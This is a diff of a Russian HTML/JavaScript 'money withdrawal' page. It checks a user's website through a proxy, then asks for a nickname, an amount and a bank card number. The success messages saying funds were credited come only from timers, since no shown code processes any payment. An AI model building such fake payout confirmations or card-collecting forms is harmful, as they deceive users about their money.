@@ -2,25 +2,25 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Вывод денег</title>
 <style>
   :root{
-    --bg-deep:#d6e4f0;
-    --bg-soft:#e8f0f8;
+    --bg-deep:#d0e1f0;
+    --bg-soft:#e6f0f8;
     --card:#ffffff;
     --line:#b8cfe0;
-    --line-focus:#8fb8d4;
-    --ink:#243b53;
-    --muted:#6b8aa5;
+    --line-focus:#7ba7c7;
+    --ink:#1e3448;
+    --muted:#647f96;
     --accent:#4a7fa5;
-    --accent-d:#3a6a8c;
+    --accent-d:#386a8c;
     --accent-l:#b5d0e4;
     --ok:#4e8c6e;
-    --err:#b05e5e;
+    --err:#c05a5a;
     --shadow:0 12px 40px rgba(58,106,140,.12);
   }
-  *{box-sizing:border-box;margin:0;padding:0}
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
   body{
     font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
     background:
@@ -29,15 +29,15 @@
       linear-gradient(155deg,var(--bg-soft) 0%,var(--bg-deep) 100%);
     min-height:100vh;
     display:flex;align-items:center;justify-content:center;
-    padding:28px 20px;color:var(--ink);
+    padding:20px 16px;color:var(--ink);
   }
   .app{
-    width:100%;max-width:460px;
+    width:100%;max-width:440px;
     background:var(--card);
     border:1px solid rgba(184,207,224,.6);
     border-radius:20px;
     box-shadow:var(--shadow);
-    padding:32px 28px 28px;
+    padding:28px 24px 24px;
     position:relative;
     overflow:hidden;
   }
@@ -45,87 +45,108 @@
     content:'';position:absolute;top:0;left:0;right:0;height:3px;
     background:linear-gradient(90deg,var(--accent-l),var(--accent),var(--accent-l));
   }
-  .head{display:flex;align-items:center;gap:14px;margin-bottom:26px}
+  .head{display:flex;align-items:center;gap:12px;margin-bottom:22px}
   .head-icon{
-    width:44px;height:44px;flex:0 0 auto;
+    width:42px;height:42px;flex:0 0 auto;
     background:linear-gradient(135deg,#e3eef7,#d0e2f0);
     border-radius:12px;
     display:flex;align-items:center;justify-content:center;
     border:1px solid #c5d9e8;
   }
-  h1{font-size:20px;font-weight:650;letter-spacing:-.2px}
-  .sub{font-size:12.5px;color:var(--muted);margin-top:3px}
+  h1{font-size:19px;font-weight:650;letter-spacing:-.2px}
+  .sub{font-size:12px;color:var(--muted);margin-top:2px}
 
   .step{display:none}
   .step.active{display:block;animation:slideIn .3s cubic-bezier(.22,.61,.36,1)}
   @keyframes slideIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
 
-  label{display:block;font-size:12.5px;font-weight:500;color:var(--muted);margin:16px 0 7px;letter-spacing:.2px}
+  label{display:block;font-size:12.5px;font-weight:500;color:var(--muted);margin:14px 0 6px;letter-spacing:.2px}
   input{
-    width:100%;padding:12px 14px;font-size:14.5px;
-    border:1.5px solid var(--line);border-radius:11px;
+    width:100%;padding:12px 14px;font-size:15px;
+    border:1.5px solid var(--line);border-radius:10px;
     background:#f6fafd;color:var(--ink);outline:none;
     transition:border .2s, box-shadow .2s, background .2s;
   }
   input:hover{border-color:#a8c4d8}
   input:focus{
     border-color:var(--line-focus);background:#fff;
-    box-shadow:0 0 0 4px rgba(143,184,212,.18);
+    box-shadow:0 0 0 3px rgba(123,167,199,.18);
   }
-  input::placeholder{color:#a0b8cc}
+  input::placeholder{color:#a0b8cc;font-size:14px}
 
   .btn{
-    width:100%;margin-top:22px;padding:13px;
-    border:none;border-radius:11px;cursor:pointer;
+    width:100%;margin-top:20px;padding:13px;
+    border:none;border-radius:10px;cursor:pointer;
     background:linear-gradient(180deg,var(--accent),var(--accent-d));
     color:#fff;font-size:14px;font-weight:600;letter-spacing:.3px;
-    display:flex;align-items:center;justify-content:center;gap:9px;
+    display:flex;align-items:center;justify-content:center;gap:8px;
     transition:filter .18s, transform .08s, box-shadow .18s;
-    box-shadow:0 4px 14px rgba(74,127,165,.28);
+    box-shadow:0 4px 14px rgba(74,127,165,.25);
   }
-  .btn:hover{filter:brightness(1.08);box-shadow:0 6px 18px rgba(74,127,165,.34)}
-  .btn:active{transform:translateY(1px);box-shadow:0 2px 8px rgba(74,127,165,.22)}
+  .btn:hover{filter:brightness(1.08)}
+  .btn:active{transform:translateY(1px);box-shadow:0 2px 8px rgba(74,127,165,.2)}
   .btn:disabled{opacity:.6;cursor:default;filter:none;box-shadow:none}
 
   .btn.ghost{
     background:#f2f7fb;color:var(--accent-d);
     border:1.5px solid var(--line);box-shadow:none;
   }
-  .btn.ghost:hover{background:#e8f2f9;border-color:#a8c4d8}
+  .btn.ghost:hover{background:#e8f2f9}
 
-  .msg{
-    display:flex;align-items:flex-start;gap:11px;
-    padding:13px 15px;border-radius:11px;font-size:13.5px;line-height:1.5;
-    margin-top:18px;
+  .btn-row{display:flex;gap:10px;margin-top:18px}
+  .btn-row .btn{margin-top:0}
+
+  .msg-line{
+    display:none;align-items:center;gap:7px;
+    font-size:13px;margin-top:8px;padding-left:2px;
+    animation:fadeIn .2s ease;
   }
-  .msg.ok{background:#edf6f1;border:1px solid #c8e0d4;color:#3a6b52}
-  .msg.err{background:#faf0f0;border:1px solid #e8cccc;color:#8a4b4b}
-  .msg.info{background:#eff5fb;border:1px solid #c5d9e8;color:#3f6480}
-  .msg svg{flex:0 0 auto;margin-top:1px}
-  .msg b{font-weight:600}
+  .msg-line.err{color:var(--err);display:flex}
+  .msg-line.ok{color:var(--ok);display:flex}
+  @keyframes fadeIn{from{opacity:0}to{opacity:1}}
 
-  .hint{font-size:12px;color:var(--muted);margin-top:12px;text-align:center;letter-spacing:.2px}
-  .divider{height:1px;background:linear-gradient(90deg,transparent,var(--line),transparent);margin:22px 0}
+  /* Карточка сайта */
+  .site-card{
+    background:#f7fafd;border:1px solid #d0e2ef;
+    border-radius:14px;padding:18px;margin-bottom:20px;
+    box-shadow: 0 2px 10px rgba(0,0,0,.02);
+  }
+  .site-row {
+    display: flex; flex-direction: column; gap: 12px;
+  }
+  .site-item {
+    display: flex; flex-direction: column; gap: 4px;
+  }
+  .site-label {
+    font-size: 11px; text-transform: uppercase; letter-spacing: .5px;
+    color: var(--muted); font-weight: 600;
+  }
+  .site-value {
+    font-size: 14px; color: var(--ink); font-weight: 500;
+    word-break: break-all; line-height: 1.4;
+  }
+  .site-value.link {
+    color: var(--accent); text-decoration: none;
+    border-bottom: 1px solid rgba(74,127,165,.3);
+    transition: border-color .2s;
+  }
+  .site-value.link:hover { border-color: var(--accent); }
 
+  .divider{height:1px;background:linear-gradient(90deg,transparent,var(--line),transparent);margin:20px 0}
   .summary{font-size:13px;color:var(--muted);line-height:1.8}
   .summary b{color:var(--ink);font-weight:600}
 
   .spinner{
-    width:17px;height:17px;border:2.5px solid rgba(255,255,255,.4);
+    width:16px;height:16px;border:2px solid rgba(255,255,255,.4);
     border-top-color:#fff;border-radius:50%;
     animation:spin .7s linear infinite;
   }
   @keyframes spin{to{transform:rotate(360deg)}}
 
   .center{text-align:center}
-  .big-icon{display:flex;justify-content:center;margin-bottom:16px}
-  .title{font-size:17px;font-weight:650;margin-bottom:8px;letter-spacing:-.2px}
-
-  .site-name{
-    display:inline-block;margin-top:4px;padding:4px 10px;
-    background:#e8f2f9;border-radius:6px;
-    font-weight:600;color:var(--accent-d);font-size:13px;
-  }
+  .big-icon{display:flex;justify-content:center;margin-bottom:14px}
+  .title-lg{font-size:17px;font-weight:650;margin-bottom:6px;letter-spacing:-.2px}
+  .timer-text{font-size:12px;color:var(--muted);margin-top:12px;text-align:center;letter-spacing:.2px}
 </style>
 </head>
 <body>
@@ -133,7 +154,7 @@
 
   <div class="head">
     <div class="head-icon">
-      <svg width="26" height="26" viewBox="0 0 34 34" fill="none">
+      <svg width="24" height="24" viewBox="0 0 34 34" fill="none">
         <rect x="2" y="6" width="30" height="22" rx="4" stroke="#4a7fa5" stroke-width="2"/>
         <rect x="2" y="11" width="30" height="4" fill="#b5d0e4"/>
         <circle cx="25" cy="22" r="3" fill="#4a7fa5"/>
@@ -141,7 +162,7 @@
     </div>
     <div>
       <h1>Вывод денег</h1>
-      <div class="sub">Оформление заявки на вывод средств</div>
+      <div class="sub">Оформление заявки на вывод</div>
     </div>
   </div>
 
@@ -156,12 +177,50 @@
       </svg>
       Проверить сайт
     </button>
-    <div id="msgSite"></div>
+    <div class="msg-line" id="msgSite"></div>
   </div>
 
   <!-- ШАГ 2 -->
   <div class="step" id="step2">
-    <div class="msg ok" id="siteFound"></div>
+    <div class="site-card">
+      <div class="site-row">
+        <div class="site-item">
+          <span class="site-label">Название</span>
+          <span class="site-value" id="siteName">...</span>
+        </div>
+        <div class="site-item">
+          <span class="site-label">Домен</span>
+          <span class="site-value" id="siteDomain">...</span>
+        </div>
+        <div class="site-item">
+          <span class="site-label">Ссылка</span>
+          <a href="#" target="_blank" class="site-value link" id="siteLink">...</a>
+        </div>
+        <div class="site-item" id="siteHostBox" style="display:none">
+          <span class="site-label">Создан на</span>
+          <span class="site-value" id="siteHost">...</span>
+        </div>
+      </div>
+    </div>
+    
+    <div id="siteConfirmBox">
+      <div style="font-size:14px;color:var(--muted);margin-bottom:14px;text-align:center;">Это ваш сайт?</div>
+      <div class="btn-row">
+        <button class="btn ghost" id="btnSiteNo" style="flex:1">Нет</button>
+        <button class="btn" id="btnSiteYes" style="flex:1">Да, верно</button>
+      </div>
+    </div>
+
+    <div id="profileBox" style="display:none">
+      <label>Ссылка на профиль</label>
+      <input id="inProfile" type="text" placeholder="https://site.com/user/..." autocomplete="off" spellcheck="false">
+      <button class="btn" id="btnProfile">Продолжить</button>
+      <div class="msg-line" id="msgProfile"></div>
+    </div>
+  </div>
+
+  <!-- ШАГ 3 -->
+  <div class="step" id="step3">
     <label>Ник на сайте</label>
     <input id="inNick" type="text" placeholder="Ваш ник" autocomplete="off" spellcheck="false">
     <button class="btn" id="btnNick">
@@ -171,11 +230,11 @@
       </svg>
       Продолжить
     </button>
-    <div id="msgNick"></div>
+    <div class="msg-line" id="msgNick"></div>
   </div>
 
-  <!-- ШАГ 3 -->
-  <div class="step" id="step3">
+  <!-- ШАГ 4 -->
+  <div class="step" id="step4">
     <label>Сумма вывода</label>
     <input id="inAmount" type="text" placeholder="0" inputmode="numeric" autocomplete="off">
     <label>Номер карты</label>
@@ -187,25 +246,25 @@
       </svg>
       Вывести
     </button>
-    <div id="msgWithdraw"></div>
+    <div class="msg-line" id="msgWithdraw"></div>
   </div>
 
-  <!-- ШАГ 4 -->
-  <div class="step" id="step4">
+  <!-- ШАГ 5 -->
+  <div class="step" id="step5">
     <div class="center">
       <div class="big-icon">
-        <svg width="54" height="54" viewBox="0 0 52 52" fill="none">
+        <svg width="48" height="48" viewBox="0 0 52 52" fill="none">
           <circle cx="26" cy="26" r="24" stroke="#b5d0e4" stroke-width="2"/>
           <path d="M16 27l7 7 13-14" stroke="#4e8c6e" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
       </div>
-      <div class="title">Заявка на вывод создана!</div>
-      <div class="summary">Ожидайте обработки: 5–10 минут.</div>
+      <div class="title-lg">Заявка на вывод создана!</div>
+      <div class="summary" style="margin-bottom:16px">Ожидайте обработки: 5–10 минут.</div>
     </div>
     <div class="divider"></div>
     <div class="summary" id="orderSummary"></div>
-    <div class="msg info" id="statusMsg" style="display:none"></div>
-    <div id="timerWrap" class="hint"></div>
+    <div class="msg-line ok" id="statusMsg" style="margin-top:16px; justify-content:center;"></div>
+    <div class="timer-text" id="timerWrap"></div>
     <button class="btn" id="btnNew" style="display:none">Новый вывод</button>
     <button class="btn ghost" id="btnStay" style="display:none">Остаться здесь</button>
   </div>
@@ -215,19 +274,20 @@
 <script>
 (function(){
   const $ = id => document.getElementById(id);
-  const steps = {1:$('step1'),2:$('step2'),3:$('step3'),4:$('step4')};
+  const steps = {1:$('step1'),2:$('step2'),3:$('step3'),4:$('step4'),5:$('step5')};
+  
   function show(n){
     Object.values(steps).forEach(s=>s.classList.remove('active'));
     steps[n].classList.add('active');
+    window.scrollTo({top:0, behavior:'smooth'});
   }
 
-  const ICON_OK = '<svg width="16" height="16" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="7" stroke="#4e8c6e" stroke-width="1.5"/><path d="M5 8l2 2 4-4" stroke="#4e8c6e" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>';
-  const ICON_ERR = '<svg width="16" height="16" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="7" stroke="#b05e5e" stroke-width="1.5"/><path d="M8 4.5v4.5M8 11.2v.3" stroke="#b05e5e" stroke-width="1.7" stroke-linecap="round"/></svg>';
-  const ICON_INFO = '<svg width="16" height="16" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="7" stroke="#4a7fa5" stroke-width="1.5"/><path d="M8 7v4M8 4.8v.3" stroke="#4a7fa5" stroke-width="1.7" stroke-linecap="round"/></svg>';
+  const ICON_OK = '<svg width="14" height="14" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="6" stroke="#4e8c6e" stroke-width="1.5"/><path d="M5 8l2 2 4-4" stroke="#4e8c6e" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+  const ICON_ERR = '<svg width="14" height="14" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="6" stroke="#c05a5a" stroke-width="1.5"/><path d="M8 4.5v3.5M8 10.5v.3" stroke="#c05a5a" stroke-width="1.7" stroke-linecap="round"/></svg>';
 
   function setMsg(el, type, text){
-    el.className = 'msg ' + type;
-    el.innerHTML = (type==='ok'?ICON_OK:type==='err'?ICON_ERR:ICON_INFO) + '<span>'+text+'</span>';
+    el.className = 'msg-line ' + type;
+    el.innerHTML = (type==='ok'?ICON_OK:ICON_ERR) + '<span>'+text+'</span>';
     el.style.display = 'flex';
   }
   function clearMsg(el){ el.style.display='none'; el.innerHTML=''; }
@@ -243,97 +303,124 @@
     }catch(e){ return null; }
   }
 
-  let state = { site:'', siteName:'', nick:'', amount:'', card:'' };
+  let state = { site:'', siteName:'', nick:'', profile:'', amount:'', card:'' };
 
-  // РЕАЛЬНАЯ ПРОВЕРКА: через allorigins.win получаем HTML, парсим <title> или og:site_name
+  // --- Проверка сайта ---
   $('btnSite').addEventListener('click', async () => {
-    const box = $('msgSite');
-    clearMsg(box);
+    const box = $('msgSite'); clearMsg(box);
     const u = normalizeUrl($('inSite').value);
-    if(!u){
-      setMsg(box,'err','Введите корректную ссылку на сайт.');
-      return;
-    }
+    if(!u){ setMsg(box,'err','Введите корректную ссылку.'); return; }
 
     const btn = $('btnSite');
     btn.disabled = true;
-    btn.innerHTML = '<span class="spinner"></span> Проверка сайта...';
+    btn.innerHTML = '<span class="spinner"></span> Анализ...';
 
     try{
-      const target = u.href;
-      const proxy = 'https://api.allorigins.win/get?url=' + encodeURIComponent(target);
-      const resp = await fetch(proxy, { signal: AbortSignal.timeout(12000) });
-
+      const proxy = 'https://api.allorigins.win/get?url=' + encodeURIComponent(u.href);
+      const resp = await fetch(proxy, { signal: AbortSignal.timeout(10000) });
       if(!resp.ok) throw new Error('network');
       const data = await resp.json();
-
-      if(!data.contents || data.contents.trim().length < 20){
-        throw new Error('empty');
-      }
+      if(!data.contents || data.contents.trim().length < 20) throw new Error('empty');
 
       const html = data.contents;
       let siteTitle = '';
 
-      // 1. og:site_name
+      // 1. Извлекаем название (title или og:site_name)
       const ogSite = html.match(/<meta[^>]+property=["']og:site_name["'][^>]+content=["']([^"']+)["']/i)
                   || html.match(/<meta[^>]+content=["']([^"']+)["'][^>]+property=["']og:site_name["']/i);
       if(ogSite) siteTitle = ogSite[1].trim();
 
-      // 2. <title>
       if(!siteTitle){
         const t = html.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
         if(t) siteTitle = t[1].replace(/\s+/g,' ').trim();
       }
-
       if(!siteTitle) siteTitle = u.hostname;
+
+      // 2. Определяем хостинг (где создан)
+      let hosting = '';
+      const h = u.hostname.toLowerCase();
+      const htmlLow = html.toLowerCase();
+
+      if(h.includes('github.io') || htmlLow.includes('github.com')) hosting = 'GitHub Pages';
+      else if(h.includes('vercel.app') || htmlLow.includes('vercel')) hosting = 'Vercel';
+      else if(h.includes('netlify.app') || htmlLow.includes('netlify')) hosting = 'Netlify';
+      else if(h.includes('cloudflare') || htmlLow.includes('cloudflare')) hosting = 'Cloudflare';
+      else if(h.includes('tilda') || htmlLow.includes('tilda')) hosting = 'Tilda';
+      else if(htmlLow.includes('wp-content') || htmlLow.includes('wordpress')) hosting = 'WordPress';
+      else if(h.includes('blogspot')) hosting = 'Blogger';
+      else if(h.includes('wix')) hosting = 'Wix';
 
       state.site = u.hostname.replace(/^www\./,'');
       state.siteName = siteTitle;
+      state.hosting = hosting;
 
-      const display = siteTitle !== state.site
-        ? '<b>'+siteTitle+'</b> <span class="site-name">'+state.site+'</span>'
-        : '<b>'+state.site+'</b>';
+      // Заполняем карточку
+      $('siteName').textContent = siteTitle;
+      $('siteDomain').textContent = state.site;
+      
+      const linkEl = $('siteLink');
+      linkEl.textContent = u.href;
+      linkEl.href = u.href;
 
-      setMsg($('siteFound'),'ok','Сайт найден: '+display);
-      setTimeout(()=>{ show(2); $('inNick').focus(); }, 450);
+      if(hosting){
+        $('siteHostBox').style.display = 'flex';
+        $('siteHost').textContent = hosting;
+      } else {
+        $('siteHostBox').style.display = 'none';
+      }
 
+      show(2);
     }catch(err){
-      // Фоллбэк: если прокси не ответил, пробуем напрямую (иногда работает, если сайт отдаёт CORS)
-      try{
-        const resp2 = await fetch(u.href, { method:'HEAD', signal: AbortSignal.timeout(6000) });
-        if(resp2.ok){
-          state.site = u.hostname.replace(/^www\./,'');
-          state.siteName = state.site;
-          setMsg($('siteFound'),'ok','Сайт найден: <b>'+state.site+'</b>');
-          setTimeout(()=>{ show(2); $('inNick').focus(); }, 450);
-          return;
-        }
-      }catch(e2){ /* ignore */ }
-
-      setMsg(box,'err','Не удалось проверить сайт. Убедитесь, что ссылка верна и сайт доступен.');
+      setMsg(box,'err','Сайт не найден или недоступен.');
     }finally{
       btn.disabled = false;
       btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="#fff" stroke-width="1.7"/><path d="M11 11l3.5 3.5" stroke="#fff" stroke-width="1.7" stroke-linecap="round"/></svg> Проверить сайт';
     }
   });
-
   $('inSite').addEventListener('keydown', e => { if(e.key==='Enter') $('btnSite').click(); });
 
-  // НИК
+  // --- Подтверждение ---
+  $('btnSiteYes').addEventListener('click', () => {
+    show(3);
+    $('inNick').focus();
+  });
+  
+  $('btnSiteNo').addEventListener('click', () => {
+    $('siteConfirmBox').style.display = 'none';
+    $('profileBox').style.display = 'block';
+    $('inProfile').focus();
+  });
+
+  $('btnProfile').addEventListener('click', () => {
+    const box = $('msgProfile'); clearMsg(box);
+    const prof = $('inProfile').value.trim();
+    if(!prof) { setMsg(box, 'err', 'Введите ссылку на профиль.'); return; }
+    state.profile = prof;
+    show(3);
+    $('inNick').focus();
+  });
+  $('inProfile').addEventListener('keydown', e => { if(e.key==='Enter') $('btnProfile').click(); });
+
+  // --- Ник ---
   $('btnNick').addEventListener('click', () => {
     const box = $('msgNick'); clearMsg(box);
     const nick = $('inNick').value.trim();
-    if(nick.length < 2){ setMsg(box,'err','Введите ник (минимум 2 символа).'); return; }
+    if(nick.length < 2){ setMsg(box,'err','Ник должен быть не менее 2 символов.'); return; }
     state.nick = nick;
-    show(3);
+    show(4);
     $('inAmount').focus();
   });
   $('inNick').addEventListener('keydown', e => { if(e.key==='Enter') $('btnNick').click(); });
 
-  // СУММА / КАРТА
-  $('inAmount').addEventListener('input', e => { e.target.value = e.target.value.replace(/[^\d]/g,''); });
+  // --- Сумма и карта ---
+  $('inAmount').addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g, '');
+    if(v) v = Number(v).toLocaleString('ru-RU');
+    e.target.value = v;
+  });
+
   $('inCard').addEventListener('input', e => {
-    let v = e.target.value.replace(/[^\d]/g,'').slice(0,16);
+    let v = e.target.value.replace(/\D/g, '').slice(0, 16);
     e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
   });
 
@@ -352,13 +439,14 @@
 
   $('btnWithdraw').addEventListener('click', () => {
     const box = $('msgWithdraw'); clearMsg(box);
-    const amount = $('inAmount').value.trim();
+    const amountStr = $('inAmount').value.replace(/\s/g,'');
     const card = $('inCard').value.replace(/\s/g,'');
 
-    if(!amount || +amount <= 0){ setMsg(box,'err','Введите сумму вывода.'); return; }
-    if(card.length !== 16 || !luhn(card)){ setMsg(box,'err','Введите корректный номер карты (16 цифр).'); return; }
+    if(!amountStr || +amountStr <= 0){ setMsg(box,'err','Введите сумму вывода.'); return; }
+    if(card.length !== 16 || !luhn(card)){ setMsg(box,'err','Некорректный номер карты.'); return; }
 
-    state.amount = amount; state.card = card;
+    state.amount = amountStr;
+    state.card = card;
 
     const btn = $('btnWithdraw');
     btn.disabled = true;
@@ -371,30 +459,33 @@
     }, 800);
   });
 
+  // --- Ожидание ---
   function fmtCard(c){ return '**** **** **** ' + c.slice(-4); }
 
   function startOrder(){
-    clearTimers(); show(4);
+    clearTimers(); show(5);
 
-    $('orderSummary').innerHTML =
-      'Сайт: <b>'+(state.siteName || state.site)+'</b><br>' +
-      'Ник: <b>'+state.nick+'</b><br>' +
+    let summary = 'Сайт: <b>'+(state.siteName || state.site)+'</b><br>';
+    if(state.profile) summary += 'Профиль: <b>' + state.profile + '</b><br>';
+    summary += 'Ник: <b>'+state.nick+'</b><br>' +
       'Сумма: <b>'+Number(state.amount).toLocaleString('ru-RU')+' ₽</b><br>' +
       'Карта: <b>'+fmtCard(state.card)+'</b>';
+    
+    $('orderSummary').innerHTML = summary;
 
     const status = $('statusMsg');
-    setMsg(status,'info','Заявка на вывод создана! Ждите 5–10 минут.');
+    setMsg(status,'ok','Заявка создана. Ожидайте.');
 
     $('btnNew').style.display = 'none';
     $('btnStay').style.display = 'none';
     $('timerWrap').textContent = '';
 
     timers.push(setTimeout(() => {
-      setMsg(status,'info','Вывод обрабатывается. Пожалуйста, подождите.');
+      setMsg(status,'ok','Вывод обрабатывается...');
     }, 30000));
 
     timers.push(setTimeout(() => {
-      setMsg(status,'ok','Вывод завершён. Средства зачислены на карту.');
+      setMsg(status,'ok','Вывод завершён. Средства зачислены.');
       $('btnNew').style.display = 'flex';
       $('btnStay').style.display = 'flex';
       $('timerWrap').textContent = '';
@@ -413,9 +504,11 @@
 
   $('btnNew').addEventListener('click', () => {
     clearTimers();
-    state = { site:'', siteName:'', nick:'', amount:'', card:'' };
-    $('inSite').value=''; $('inNick').value=''; $('inAmount').value=''; $('inCard').value='';
-    ['msgSite','msgNick','msgWithdraw','siteFound','statusMsg'].forEach(id=>clearMsg($(id)));
+    state = { site:'', siteName:'', nick:'', profile:'', amount:'', card:'' };
+    $('inSite').value=''; $('inNick').value=''; $('inAmount').value=''; $('inCard').value=''; $('inProfile').value='';
+    ['msgSite','msgNick','msgWithdraw','msgProfile','statusMsg'].forEach(id=>clearMsg($(id)));
+    $('siteConfirmBox').style.display = 'block';
+    $('profileBox').style.display = 'none';
     show(1); $('inSite').focus();
   });
 
@@ -427,4 +520,4 @@
 })();
 </script>
 </body>
-  </html>
+        </html>
